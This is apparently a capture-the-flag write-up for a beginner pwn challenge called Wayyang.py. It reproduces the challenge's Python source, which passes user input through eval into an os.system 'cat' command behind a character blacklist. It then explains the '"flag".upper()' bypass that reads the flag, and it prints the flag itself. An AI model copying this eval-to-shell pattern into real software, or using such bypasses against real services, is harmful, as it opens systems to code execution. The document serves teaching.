# 🧑‍🎓 Wayyang.py

**Category**: Pwn

100 points | 209 solves

----

## Challenge Description

Infintesky as a service <3

`nc [ip]`

## Attached files

* wayyang.py

### wayyang.py

I just need to preserve this glorious ASCII art ok

```py
#!/usr/local/bin/python
import os

FLAG_FILE = "FLAG"

def get_input() -> int:
    print('''                 ,#####,
                 #_   _#
                 |a` `a|
                 |  u  |            ________________________
                 \  =  /           |        WAYYANG         |
                 |\___/|           <     TERMINAL  v1.0     |
        ___ ____/:     :\____ ___  |________________________|
      .'   `.-===-\   /-===-.`   '.
     /      .-"""""-.-"""""-.      \
    /'             =:=             '\
  .'  ' .:    o   -=:=-   o    :. '  `.
  (.'   /'. '-.....-'-.....-' .'\   '.)
  /' ._/   ".     --:--     ."   \_. '\
 |  .'|      ".  ---:---  ."      |'.  |
 |  : |       |  ---:---  |       | :  |
  \ : |       |_____._____|       | : /
  /   (       |----|------|       )   \
 /... .|      |    |      |      |. ...\
|::::/'' jgs /     |       \     ''\::::|
'""""       /'    .L_      `\       """"'
           /'-.,__/` `\__..-'\
          ;      /     \      ;
          :     /       \     |
          |    /         \.   |
          |`../           |  ,/
          ( _ )           |  _)
          |   |           |   |
          |___|           \___|
          :===|            |==|
           \  /            |__|
           /\/\           /"""`8.__
           |oo|           \__.//___)
           |==|
           \__/''')
    print("What would you like to do today?")
    print("1. Weather")
    print("2. Time")
    print("3. Tiktok of the day")
    print("4. Read straits times")
    print("5. Get flag")
    print("6. Exit")

    choice = int(input(">> "))

    return choice


if __name__ == '__main__':
    choice = get_input()

    if choice == 1:
        print("CLEAR SKIES FOR HANDSOME MEN")
    elif choice == 2:
        print("IT'S ALWAYS SEXY TIME")
    elif choice == 3:
        print("https://www.tiktok.com/@benawad/video/7039054021797252399")
    elif choice == 4:
        filename = input("which news article you want babe :)   ")
        not_allowed = [char for char in FLAG_FILE]

        for char in filename:
            if char in not_allowed:
                print("NICE TRY. WAYYANG SEE YOU!!!!!")
                os.system(f"cat news.txt")
                exit()

        try:
            os.system(f"cat {eval(filename)}")
        except:
            pass
    elif choice == 5:
        print("NOT READY YET. MAYBE AFTER CTF????")
```

----

## Solution

When looking at the source code, we can see that the flag file is called `FLAG`. We can also see that choice 4 lets us `cat` a file.

If we try inputting `FILE`, it blocks us, and outputs a different text file instead:

```text
>> 4
which news article you want babe :)   FLAG
NICE TRY. WAYYANG SEE YOU!!!!!
WAYYANG DECLARED SEXIEST MAN ALIVE

SINGAPORE - In the latest edition of Mister Universe, Wayyang won again, surprising absolutely no one.
The judges were blown away by his awesome abdominals and stunned by his sublime sexiness.
When asked for his opinions on his latest win, Wayyang said nothing, choosing to smoulder into the distance.
```

Truly top tier journalism.

It turns out that it blocks us from inputting any file name containing the characters `F`, `I`, `L`, or `E`:

```py
elif choice == 4:
        filename = input("which news article you want babe :)   ")
        not_allowed = [char for char in FLAG_FILE]

        for char in filename:
            if char in not_allowed:
                print("NICE TRY. WAYYANG SEE YOU!!!!!")
                os.system(f"cat news.txt")
                exit()
```

However, we can also see that if it passes the check, it first `eval()`s our input and then `cat`s it:

```py
        try:
            os.system(f"cat {eval(filename)}")
        except:
            pass
```

We can then make use of the Python method `.upper()` to convert a lowercase string `"flag"` to its uppercase version `"FLAG"`. Since it only blocks the uppercase characters, our input is allowed through and we can get the flag:

```text
>> 4
which news article you want babe :)   "flag".upper()
SEE{wayyang_as_a_service_621331e420c46e29cfde50f66ad184cc}
```

### Flag

```text
SEE{wayyang_as_a_service_621331e420c46e29cfde50f66ad184cc}
```
